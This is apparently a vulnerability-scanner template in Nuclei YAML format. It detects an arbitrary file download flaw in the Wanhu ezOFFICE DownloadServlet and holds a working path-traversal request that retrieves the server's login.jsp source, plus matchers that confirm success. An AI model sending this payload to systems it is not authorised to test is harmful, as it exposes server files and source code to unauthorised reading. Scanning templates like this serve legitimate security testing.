id: poc-yaml-wan-hu-ezoffice-downloadservlet-anyfile-download
info:
  name: 万户 ezOFFICE DownloadServlet 任意文件下载漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read

http:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/DownloadServlet?modeType=2&path=html&FileName=..%5C..%5Clogin.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/x-msdownload;charset=GBK"
      - type: word
        part: body
        words:
          - "万户ezOFFICE协同管理平台"
          - "request.getParameter(\"logoindexpicaccName\")"
